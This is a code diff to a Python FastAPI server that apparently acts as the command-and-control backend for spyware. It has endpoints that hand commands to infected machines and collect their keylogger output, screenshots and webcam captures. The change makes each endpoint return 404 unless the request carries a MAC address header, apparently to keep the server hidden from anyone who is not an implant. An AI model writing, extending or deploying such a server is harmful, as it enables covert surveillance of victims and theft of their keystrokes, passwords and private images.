@@ -1,6 +1,6 @@
 import uvicorn
 import os
-from fastapi import FastAPI, Request, Form, Depends
+from fastapi import FastAPI, Request, Form, Depends, HTTPException
 from fastapi.responses import HTMLResponse
 from fastapi.security import HTTPBasicCredentials
 from typing import Dict, List, Union
@@ -52,29 +52,49 @@ async def add_commands(credentials: HTTPBasicCredentials = Depends(verify_creden
 
 
 @app.get('/first_command')
-async def first_command(request: Request) -> Dict[str, List[str]]:
+async def first_command(request: Request) -> Union[Dict[str, List[str]], HTTPException]:
+    try:
+        request.headers[HTTPHeaders.MAC]
+    except KeyError:
+        return HTTPException(status_code=404)
     return handle_first_command(request)
 
 
 @app.get('/command')
-async def command(request: Request) -> Dict[str, List[str]]:
+async def command(request: Request) -> Union[Dict[str, List[str]], HTTPException]:
+    try:
+        request.headers[HTTPHeaders.MAC]
+    except KeyError:
+        return HTTPException(status_code=404)
     return handle_command_request(request)
 
 
 @app.post('/keylog_data')
-async def keylog(request: Request) -> None:
+async def keylog(request: Request) -> Union[None, HTTPException]:
+    try:
+        request.headers[HTTPHeaders.MAC]
+    except KeyError:
+        return HTTPException(status_code=404)
     await upload_file(request, 'log', DBIdentifiers.KEYLOG, 'txt', True)
 
 
 @app.post('/screenshot')
-async def screenshot(request: Request) -> None:
+async def screenshot(request: Request) -> Union[None, HTTPException]:
+    try:
+        request.headers[HTTPHeaders.MAC]
+    except KeyError:
+        return HTTPException(status_code=404)
     # retrieve image file type
     file_type = request.headers[HTTPHeaders.CONTENT_TYPE].split('/')[1]
     await upload_file(request, 'screenshot', DBIdentifiers.SCREENSHOT, file_type)
 
 
 @app.post('/webcam_capture')
-async def webcam_capture(request: Request) -> None:
+async def webcam_capture(request: Request) -> Union[None, HTTPException]:
+    try:
+        request.headers[HTTPHeaders.MAC]
+    except KeyError:
+        return HTTPException(status_code=404)
     # retrieve image file type
     file_type = request.headers[HTTPHeaders.CONTENT_TYPE].split('/')[1]
     await upload_file(request, 'webcam', DBIdentifiers.WEBCAM, file_type)
